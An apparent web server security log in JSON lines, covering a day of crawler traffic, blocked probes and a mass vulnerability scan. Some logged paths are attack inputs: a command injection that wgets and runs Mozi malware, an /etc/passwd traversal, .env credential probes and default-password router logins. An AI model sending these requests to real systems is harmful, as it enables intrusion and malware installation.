+{"time": "2026-08-08 23:23:56", "ip": "195.182.16.23", "path": "/SDK/webLanguage", "action": "allowed"}
+{"time": "2026-08-08 23:59:17", "ip": "5.61.209.44", "path": "/SDK/webLanguage", "action": "allowed"}
+{"time": "2026-08-09 00:37:53", "ip": "195.182.16.23", "path": "/SDK/webLanguage", "action": "allowed"}
+{"time": "2026-08-09 00:47:30", "ip": "52.167.144.173", "path": "/Bootstrap-5-portfolio-template/images/services/service-2.png", "action": "allowed"}
+{"time": "2026-08-09 01:05:52", "ip": "52.167.144.213", "path": "/Bootstrap-5-portfolio-template/images/portfolio/portfolio-9.jpg", "action": "allowed"}
+{"time": "2026-08-09 01:08:02", "ip": "40.77.167.30", "path": "/Bootstrap-5-portfolio-template/images/campanies/campany-5.png", "action": "allowed"}
+{"time": "2026-08-09 01:21:53", "ip": "52.167.144.183", "path": "/Bootstrap-5-portfolio-template/images/portfolio/portfolio-8.jpg", "action": "allowed"}
+{"time": "2026-08-09 01:27:24", "ip": "5.61.209.44", "path": "/SDK/webLanguage", "action": "allowed"}
+{"time": "2026-08-09 02:07:29", "ip": "185.72.241.71", "path": "/.env", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-09 02:07:30", "ip": "185.72.241.71", "path": "/", "action": "backend_error", "error": "HTTP Error 405: METHOD NOT ALLOWED"}
+{"time": "2026-08-09 02:34:32", "ip": "161.35.146.76", "path": "/", "action": "allowed"}
+{"time": "2026-08-09 02:34:37", "ip": "161.35.146.76", "path": "/favicon.ico", "action": "allowed"}
+{"time": "2026-08-09 02:45:02", "ip": "40.77.167.150", "path": "/Bootstrap-5-portfolio-template/images/arts/intro-section-illustration.png", "action": "allowed"}
+{"time": "2026-08-09 03:18:16", "ip": "159.65.201.171", "path": "/", "action": "allowed"}
+{"time": "2026-08-09 03:18:22", "ip": "159.65.201.171", "path": "/favicon.ico", "action": "allowed"}
+{"time": "2026-08-09 04:04:23", "ip": "27.47.2.200", "path": "/shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws", "action": "allowed"}
+{"time": "2026-08-09 04:33:29", "ip": "20.203.208.53", "path": "/wp-content/plugins/hellopress/wp_filemanager.php", "action": "allowed"}
+{"time": "2026-08-09 04:46:43", "ip": "52.167.144.147", "path": "/Bootstrap-5-portfolio-template/images/campanies/campany-1.png", "action": "allowed"}
+{"time": "2026-08-09 04:50:04", "ip": "40.77.167.24", "path": "/Bootstrap-5-portfolio-template/images/portfolio/portfolio-2.jpg", "action": "allowed"}
+{"time": "2026-08-09 05:11:07", "ip": "145.223.41.133", "path": "/.env", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-09 05:11:08", "ip": "145.223.41.133", "path": "/", "action": "backend_error", "error": "HTTP Error 405: METHOD NOT ALLOWED"}
+{"time": "2026-08-09 05:14:12", "ip": "175.107.208.0", "path": "/boaform/admin/formLogin?username=user&psd=user", "action": "allowed"}
+{"time": "2026-08-09 05:18:18", "ip": "52.167.144.219", "path": "/Bootstrap-5-portfolio-template/images/services/service-1.png", "action": "allowed"}
+{"time": "2026-08-09 05:43:28", "ip": "40.77.167.6", "path": "/Bootstrap-5-portfolio-template/images/portfolio/portfolio-2.jpg", "action": "allowed"}
+{"time": "2026-08-09 05:57:17", "ip": "198.235.24.16", "path": "/", "action": "allowed"}
+{"time": "2026-08-09 06:16:40", "ip": "43.98.207.106", "path": "/", "action": "allowed"}
+{"time": "2026-08-09 06:16:45", "ip": "43.98.207.106", "path": "/favicon.ico", "action": "allowed"}
+{"time": "2026-08-09 06:29:53", "ip": "52.167.144.166", "path": "/Bootstrap-5-portfolio-template/images/campanies/campany-5.png", "action": "allowed"}
+{"time": "2026-08-09 06:35:40", "ip": "191.101.121.174", "path": "/.env", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-09 06:35:41", "ip": "191.101.121.174", "path": "/", "action": "backend_error", "error": "HTTP Error 405: METHOD NOT ALLOWED"}
+{"time": "2026-08-09 06:38:18", "ip": "20.65.195.49", "path": "/developmentserver/metadatauploader", "action": "allowed"}
+{"time": "2026-08-09 06:41:00", "ip": "4.223.73.90", "path": "/wp-content/plugins/hellopress/wp_filemanager.php", "action": "allowed"}
+{"time": "2026-08-09 06:42:51", "ip": "4.223.73.90", "path": "/wp-content/plugins/hellopress/wp_filemanager.php", "action": "allowed"}
+{"time": "2026-08-09 07:16:58", "ip": "52.167.144.238", "path": "/Bootstrap-5-portfolio-template/images/testimonials/client-1.jpg", "action": "allowed"}
+{"time": "2026-08-09 07:17:56", "ip": "185.242.3.82", "path": "/", "action": "allowed"}
+{"time": "2026-08-09 07:40:27", "ip": "198.235.24.237", "path": "/", "action": "allowed"}
+{"time": "2026-08-09 08:15:22", "ip": "66.132.195.119", "path": "/", "action": "allowed"}
+{"time": "2026-08-09 08:15:28", "ip": "66.132.195.119", "path": "/favicon.ico", "action": "allowed"}
+{"time": "2026-08-09 08:15:37", "ip": "66.132.195.119", "path": "/robots.txt", "action": "allowed"}
+{"time": "2026-08-09 08:15:42", "ip": "66.132.195.119", "path": "/favicon.ico", "action": "allowed"}
+{"time": "2026-08-09 08:15:48", "ip": "66.132.195.119", "path": "/aaugw1hxl", "action": "allowed"}
+{"time": "2026-08-09 08:15:53", "ip": "66.132.195.119", "path": "/favicon.ico", "action": "allowed"}
+{"time": "2026-08-09 08:32:39", "ip": "64.62.156.132", "path": "/", "action": "allowed"}
+{"time": "2026-08-09 08:39:10", "ip": "64.62.156.132", "path": "/geoserver/web/", "action": "allowed"}
+{"time": "2026-08-09 08:55:32", "ip": "107.175.208.135", "path": "/.env", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-09 08:55:34", "ip": "107.175.208.135", "path": "/", "action": "backend_error", "error": "HTTP Error 405: METHOD NOT ALLOWED"}
+{"time": "2026-08-09 09:07:01", "ip": "118.123.1.39", "path": "/getServerConfig", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-09 09:07:01", "ip": "118.123.1.39", "path": "/", "action": "allowed"}
+{"time": "2026-08-09 09:07:06", "ip": "118.123.1.39", "path": "/visitors_online", "action": "allowed"}
+{"time": "2026-08-09 09:14:11", "ip": "52.167.144.143", "path": "/Bootstrap-5-portfolio-template/images/portfolio/portfolio-4.jpg", "action": "allowed"}
+{"time": "2026-08-09 10:03:53", "ip": "40.77.167.24", "path": "/Bootstrap-5-portfolio-template/images/portfolio/portfolio-1.jpg", "action": "allowed"}
+{"time": "2026-08-09 11:05:28", "ip": "52.167.144.169", "path": "/Bootstrap-5-portfolio-template/images/campanies/campany-6.png", "action": "allowed"}
+{"time": "2026-08-09 11:05:31", "ip": "207.46.13.229", "path": "/robots.txt", "action": "allowed"}
+{"time": "2026-08-09 11:18:27", "ip": "62.210.142.39", "path": "/", "action": "allowed"}
+{"time": "2026-08-09 11:19:33", "ip": "62.210.142.39", "path": "/", "action": "allowed"}
+{"time": "2026-08-09 11:20:03", "ip": "62.210.142.39", "path": "/", "action": "allowed"}
+{"time": "2026-08-09 11:20:09", "ip": "62.210.142.39", "path": "/manage/account/login", "action": "allowed"}
+{"time": "2026-08-09 11:20:14", "ip": "62.210.142.39", "path": "/admin/index.html", "action": "allowed"}
+{"time": "2026-08-09 11:20:20", "ip": "62.210.142.39", "path": "/index.html", "action": "allowed"}
+{"time": "2026-08-09 11:20:25", "ip": "62.210.142.39", "path": "/+CSCOE+/logon.html", "action": "allowed"}
+{"time": "2026-08-09 11:32:04", "ip": "89.40.222.83", "path": "/.env", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-09 11:32:05", "ip": "89.40.222.83", "path": "/", "action": "backend_error", "error": "HTTP Error 405: METHOD NOT ALLOWED"}
+{"time": "2026-08-09 11:38:41", "ip": "47.251.117.40", "path": "/", "action": "allowed"}
+{"time": "2026-08-09 11:38:42", "ip": "47.251.117.40", "path": "/", "action": "allowed"}
+{"time": "2026-08-09 12:07:24", "ip": "20.29.57.244", "path": "/hudson", "action": "allowed"}
+{"time": "2026-08-09 12:13:14", "ip": "103.203.57.3", "path": "/", "action": "allowed"}
+{"time": "2026-08-09 12:26:36", "ip": "40.77.167.57", "path": "/Bootstrap-5-portfolio-template/images/portfolio/portfolio-9.jpg", "action": "allowed"}
+{"time": "2026-08-09 12:33:03", "ip": "185.247.137.155", "path": "/", "action": "allowed"}
+{"time": "2026-08-09 12:33:18", "ip": "112.248.81.241", "path": "/GponForm/diag_Form?images/", "action": "allowed"}
+{"time": "2026-08-09 12:58:02", "ip": "57.129.48.19", "path": "/", "action": "allowed"}
+{"time": "2026-08-09 12:58:08", "ip": "57.129.48.19", "path": "/valid8.php", "action": "allowed"}
+{"time": "2026-08-09 12:58:11", "ip": "57.129.48.19", "path": "/valid8.php", "action": "allowed"}
+{"time": "2026-08-09 12:58:14", "ip": "57.129.48.19", "path": "/RECORDINGS/", "action": "allowed"}
+{"time": "2026-08-09 12:58:18", "ip": "57.129.48.19", "path": "/RECORDINGS/", "action": "allowed"}
+{"time": "2026-08-09 13:16:12", "ip": "93.174.93.12", "path": "/", "action": "allowed"}
+{"time": "2026-08-09 14:39:54", "ip": "152.32.208.9", "path": "/", "action": "allowed"}
+{"time": "2026-08-09 14:40:00", "ip": "152.32.208.9", "path": "/favicon.ico", "action": "allowed"}
+{"time": "2026-08-09 14:40:05", "ip": "152.32.208.9", "path": "/robots.txt", "action": "allowed"}
+{"time": "2026-08-09 14:40:11", "ip": "152.32.208.9", "path": "/sitemap.xml", "action": "allowed"}
+{"time": "2026-08-09 14:40:11", "ip": "152.32.208.9", "path": "/config.json", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-09 14:55:00", "ip": "5.61.209.224", "path": "/..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-09 15:13:41", "ip": "104.168.8.216", "path": "/.env", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-09 15:13:42", "ip": "104.168.8.216", "path": "/", "action": "backend_error", "error": "HTTP Error 405: METHOD NOT ALLOWED"}
+{"time": "2026-08-09 15:30:41", "ip": "101.34.59.115", "path": "/", "action": "allowed"}
+{"time": "2026-08-09 16:03:29", "ip": "198.37.116.7", "path": "/.env", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-09 16:03:30", "ip": "198.37.116.7", "path": "/", "action": "backend_error", "error": "HTTP Error 405: METHOD NOT ALLOWED"}
+{"time": "2026-08-09 16:11:21", "ip": "40.77.167.76", "path": "/Bootstrap-5-portfolio-template/images/portfolio/portfolio-6.jpg", "action": "allowed"}
+{"time": "2026-08-09 16:13:04", "ip": "20.38.33.1", "path": "/manager/text/list", "action": "allowed"}
+{"time": "2026-08-09 16:23:06", "ip": "40.77.167.35", "path": "/", "action": "allowed"}
+{"time": "2026-08-09 16:28:52", "ip": "40.77.167.70", "path": "/Bootstrap-5-portfolio-template/images/services/service-1.png", "action": "allowed"}
+{"time": "2026-08-09 17:09:05", "ip": "44.202.18.236", "path": "/", "action": "allowed"}
+{"time": "2026-08-09 17:15:14", "ip": "40.77.167.21", "path": "/Bootstrap-5-portfolio-template/images/testimonials/client-2.jpg", "action": "allowed"}
+{"time": "2026-08-09 17:24:14", "ip": "198.235.24.6", "path": "/.well-known/security.txt", "action": "allowed"}
+{"time": "2026-08-09 17:26:15", "ip": "103.170.85.91", "path": "/boaform/admin/formLogin?username=admin&psd=admin", "action": "allowed"}
+{"time": "2026-08-09 17:32:18", "ip": "172.232.253.221", "path": "/", "action": "allowed"}
+{"time": "2026-08-09 17:32:19", "ip": "172.232.253.221", "path": "/", "action": "allowed"}
+{"time": "2026-08-09 17:32:20", "ip": "172.232.253.221", "path": "/CFIDE/componentutils/", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:20", "ip": "172.232.253.221", "path": "/login.php", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:20", "ip": "172.232.253.221", "path": "/dana-cached/hc/HostCheckerInstaller.osx", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:20", "ip": "172.232.253.221", "path": "/geoserver/index.html", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:20", "ip": "172.232.253.221", "path": "/geoserver/", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:20", "ip": "172.232.253.221", "path": "/geoserver/web/wicket/bookmarkable/org.geoserver.web.AboutGeoServerPage", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:21", "ip": "172.232.253.221", "path": "/Account/Login", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:21", "ip": "172.232.253.221", "path": "/cgi-bin/info.cgi", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:21", "ip": "172.232.253.221", "path": "/magento_version", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:21", "ip": "172.232.253.221", "path": "/xml/info.xml", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:21", "ip": "172.232.253.221", "path": "/api/v1/check-version", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:21", "ip": "172.232.253.221", "path": "/helpdesk/WebObjects/Helpdesk.woa", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:22", "ip": "172.232.253.221", "path": "/fog/management/index.php?node=client&sub=logininfo", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:22", "ip": "172.232.253.221", "path": "/cluster/list.query", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:22", "ip": "172.232.253.221", "path": "/apps/zxtm/login.cgi", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:22", "ip": "172.232.253.221", "path": "/administrator/manifests/files/joomla.xml", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:22", "ip": "172.232.253.221", "path": "/language/en-GB/en-GB.xml", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:22", "ip": "172.232.253.221", "path": "/versa/login", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:22", "ip": "172.232.253.221", "path": "/login.html", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:23", "ip": "172.232.253.221", "path": "/p/login/", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:23", "ip": "172.232.253.221", "path": "/portal/", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:23", "ip": "172.232.253.221", "path": "/api/version", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:23", "ip": "172.232.253.221", "path": "/status", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:23", "ip": "172.232.253.221", "path": "/info.asp", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:23", "ip": "172.232.253.221", "path": "/cgi-bin/param.cgi?get_device_conf", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:23", "ip": "172.232.253.221", "path": "/lms/db", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:24", "ip": "172.232.253.221", "path": "/login/login.html", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:24", "ip": "172.232.253.221", "path": "/allversions", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:24", "ip": "172.232.253.221", "path": "/ext-js/app/common/zld_product_spec.js", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:24", "ip": "172.232.253.221", "path": "/nmaplowercheck1786296738", "action": "allowed"}
+{"time": "2026-08-09 17:32:24", "ip": "172.232.253.221", "path": "/", "action": "allowed"}
+{"time": "2026-08-09 17:32:24", "ip": "172.232.253.221", "path": "/localstart.shtml", "action": "allowed"}
+{"time": "2026-08-09 17:32:24", "ip": "172.232.253.221", "path": "/", "action": "allowed"}
+{"time": "2026-08-09 17:32:24", "ip": "172.232.253.221", "path": "/nmaplowercheck1786296739", "action": "allowed"}
+{"time": "2026-08-09 17:32:24", "ip": "172.232.253.221", "path": "/versions", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:27", "ip": "172.232.253.221", "path": "/r-seenet/index.php", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:27", "ip": "172.232.253.221", "path": "/evox/about", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:27", "ip": "172.232.253.221", "path": "/HNAP1", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:27", "ip": "172.232.253.221", "path": "/api/vip/i18n/api/v2/translation/products/vRNIUI/versions/1", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:27", "ip": "172.232.253.221", "path": "/c/login", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:27", "ip": "172.232.253.221", "path": "/favicon.ico", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:27", "ip": "172.232.253.221", "path": "/tos/index.php?user/login", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:27", "ip": "172.232.253.221", "path": "/", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:27", "ip": "172.232.253.221", "path": "/kylin/", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:27", "ip": "172.232.253.221", "path": "/WebApp/js/UI_String.js", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:27", "ip": "172.232.253.221", "path": "/api/v1.0/environment", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:27", "ip": "172.232.253.221", "path": "/IPCamDesc.xml", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:27", "ip": "172.232.253.221", "path": "/officescan/console/html/localization.js", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:27", "ip": "172.232.253.221", "path": "/login.aspx", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:27", "ip": "172.232.253.221", "path": "/officescan/console/cgi/cgiChkMasterPwd.exe", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:27", "ip": "172.232.253.221", "path": "/cslu/v1/core/conf", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:27", "ip": "172.232.253.221", "path": "/CHANGELOG.txt", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:27", "ip": "172.232.253.221", "path": "/dashboard/", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:27", "ip": "172.232.253.221", "path": "/config", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:28", "ip": "172.232.253.221", "path": "/pom.xml", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:28", "ip": "172.232.253.221", "path": "/admin/reports/status", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:28", "ip": "172.232.253.221", "path": "/javascript/validation/OEM.js", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:28", "ip": "172.232.253.221", "path": "/admin/reports/updates", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:28", "ip": "172.232.253.221", "path": "/webportal.cgi", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:28", "ip": "172.232.253.221", "path": "/workplace/home.action", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:28", "ip": "172.232.253.221", "path": "/build.gradle", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:28", "ip": "172.232.253.221", "path": "/webui/index.html", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:28", "ip": "172.232.253.221", "path": "/centreon/api/latest/platform/versions", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:28", "ip": "172.232.253.221", "path": "/css/eonweb.css", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:28", "ip": "172.232.253.221", "path": "/pandora_console/", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:28", "ip": "172.232.253.221", "path": "/api/v3/meta", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:28", "ip": "172.232.253.221", "path": "/css/elfinder.min.css", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:28", "ip": "172.232.253.221", "path": "/am_bin/amlogin", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:28", "ip": "172.232.253.221", "path": "/geoserver/web/", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:28", "ip": "172.232.253.221", "path": "/system/version/current", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:28", "ip": "172.232.253.221", "path": "/cgi-bin/authLogin.cgi", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:28", "ip": "172.232.253.221", "path": "/api/v1/version", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:28", "ip": "172.232.253.221", "path": "/routes", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:28", "ip": "172.232.253.221", "path": "/hx/api/about", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:28", "ip": "172.232.253.221", "path": "/app/ui/login.jsp", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:28", "ip": "172.232.253.221", "path": "/i18n/component/JS", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:28", "ip": "172.232.253.221", "path": "/plugin/webs_model_cfg.js", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:28", "ip": "172.232.253.221", "path": "/Main_Login.asp", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:28", "ip": "172.232.253.221", "path": "/login/?next=/", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:28", "ip": "172.232.253.221", "path": "/photo/webapi/query.php?api=SYNO.API.Info&method=query&version=1", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:28", "ip": "172.232.253.221", "path": "/cgi-bin/luci", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:28", "ip": "172.232.253.221", "path": "/MagicInfo/config.js", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:28", "ip": "172.232.253.221", "path": "/json/login_session", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:28", "ip": "172.232.253.221", "path": "/rs/application-about", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:28", "ip": "172.232.253.221", "path": "/metrics", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:28", "ip": "172.232.253.221", "path": "/nidp/app/login", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:29", "ip": "172.232.253.221", "path": "/index.html", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:29", "ip": "172.232.253.221", "path": "/login", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:29", "ip": "172.232.253.221", "path": "/api/v2/hoverfly/version", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:29", "ip": "172.232.253.221", "path": "/about", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:29", "ip": "172.232.253.221", "path": "/main/main.html", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:29", "ip": "172.232.253.221", "path": "/ui/login.action", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:29", "ip": "172.232.253.221", "path": "/core/auth/login/", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:29", "ip": "172.232.253.221", "path": "/api/v1/info", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:29", "ip": "172.232.253.221", "path": "/api/status", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:29", "ip": "172.232.253.221", "path": "/admin/config.php", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:29", "ip": "172.232.253.221", "path": "/agc/vicidial.php", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:29", "ip": "172.232.253.221", "path": "/~login", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:29", "ip": "172.232.253.221", "path": "/config_dump", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:29", "ip": "172.232.253.221", "path": "/mailinspector/login.php", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:29", "ip": "172.232.253.221", "path": "/webui", "action": "allowed"}
+{"time": "2026-08-09 17:32:29", "ip": "172.232.253.221", "path": "/cgi-mod/header_logo.cgi?size=big", "action": "allowed"}
+{"time": "2026-08-09 17:32:29", "ip": "172.232.253.221", "path": "/rest/applinks/1.0/manifest", "action": "allowed"}
+{"time": "2026-08-09 17:32:29", "ip": "172.232.253.221", "path": "/", "action": "allowed"}
+{"time": "2026-08-09 17:32:29", "ip": "172.232.253.221", "path": "/index.do", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:29", "ip": "172.232.253.221", "path": "/agent/vicidial.php", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:29", "ip": "172.232.253.221", "path": "/AppsHome.do", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:29", "ip": "172.232.253.221", "path": "/system/gwinfo", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:29", "ip": "172.232.253.221", "path": "/decisioncenter-api/v1/about", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:29", "ip": "172.232.253.221", "path": "/openapi.json", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:29", "ip": "172.232.253.221", "path": "/", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:29", "ip": "172.232.253.221", "path": "/confluence/rest/applinks/1.0/manifest", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:29", "ip": "172.232.253.221", "path": "/ise/img/rm-logo_small.png", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:29", "ip": "172.232.253.221", "path": "/index.lua", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:29", "ip": "172.232.253.221", "path": "/jtcgi/wte.pyc", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:29", "ip": "172.232.253.221", "path": "/nifi-api/flow/about", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:29", "ip": "172.232.253.221", "path": "/nifi/", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:29", "ip": "172.232.253.221", "path": "/cgi-bin/meteobridge.cgi", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:29", "ip": "172.232.253.221", "path": "/info.htm", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:29", "ip": "172.232.253.221", "path": "/api-description", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:30", "ip": "172.232.253.221", "path": "/owa/", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:30", "ip": "172.232.253.221", "path": "/images/logo.png", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:30", "ip": "172.232.253.221", "path": "/sys/en/neoclassic/login/login", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:30", "ip": "172.232.253.221", "path": "/monitor/index.php/auth/login", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:30", "ip": "172.232.253.221", "path": "/v2", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:30", "ip": "172.232.253.221", "path": "/wp-content/plugins/post-smtp/readme.txt", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:30", "ip": "172.232.253.221", "path": "/sap/bc/ui2/flp", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:30", "ip": "172.232.253.221", "path": "/management/v1/cluster/state", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:30", "ip": "172.232.253.221", "path": "/ignite?cmd=version", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:30", "ip": "172.232.253.221", "path": "/browser/index.html", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:30", "ip": "172.232.253.221", "path": "/owa/", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:30", "ip": "172.232.253.221", "path": "/help/en_US/Content/utm/utmAdminGuide/WebAdmin.htm", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:30", "ip": "172.232.253.221", "path": "/phoenix/favicon.ico", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:30", "ip": "172.232.253.221", "path": "/nmc/rss/server", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:30", "ip": "172.232.253.221", "path": "/ScadaBR/login.htm", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:30", "ip": "172.232.253.221", "path": "/cgi-bin/getagent.cgi?type=s", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:30", "ip": "172.232.253.221", "path": "/api/v2.0/systeminfo", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:30", "ip": "172.232.253.221", "path": "/api/v1/cluster/summary", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:30", "ip": "172.232.253.221", "path": "/webpages/login.html", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:30", "ip": "172.232.253.221", "path": "/download/python/", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:30", "ip": "172.232.253.221", "path": "/api/system/status", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:30", "ip": "172.232.253.221", "path": "/assets/png/favicon-abe32304.png", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:30", "ip": "172.232.253.221", "path": "/sms_mp/.sms_aut?mplist", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:30", "ip": "172.232.253.221", "path": "/angular.js", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:30", "ip": "172.232.253.221", "path": "/admin", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:30", "ip": "172.232.253.221", "path": "/rest/settings", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:30", "ip": "172.232.253.221", "path": "/_matrix/identity/v2", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:30", "ip": "172.232.253.221", "path": "/rustfs/console/version", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:30", "ip": "172.232.253.221", "path": "/scripts/languages/en-US.json", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:30", "ip": "172.232.253.221", "path": "/metasys/com/jci/metasys/MetasysProperties.properties", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:30", "ip": "172.232.253.221", "path": "/remote/login", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:30", "ip": "172.232.253.221", "path": "/App_Themes/Default/Images/favicon.ico", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:30", "ip": "172.232.253.221", "path": "/backend/banner", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:30", "ip": "172.232.253.221", "path": "/idexpert/", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:30", "ip": "172.232.253.221", "path": "/UOF/Login.aspx", "action": "rate_limited"}
